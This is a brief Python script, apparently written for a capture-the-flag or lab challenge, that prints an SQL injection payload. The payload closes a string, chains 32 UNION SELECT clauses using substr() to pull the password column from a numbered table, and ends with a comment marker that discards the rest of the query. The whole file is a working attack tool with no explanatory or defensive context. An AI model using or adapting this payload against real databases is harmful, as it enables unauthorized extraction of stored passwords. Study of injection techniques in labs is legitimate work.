from sys import argv

if __name__ == "__main__":
    id = argv[1]
    print(
        f"' {' '.join(f'UNION SELECT substr(password, {idx + 1}) AS password FROM table_{id}' for idx in range(32))} ;-- -"
    )
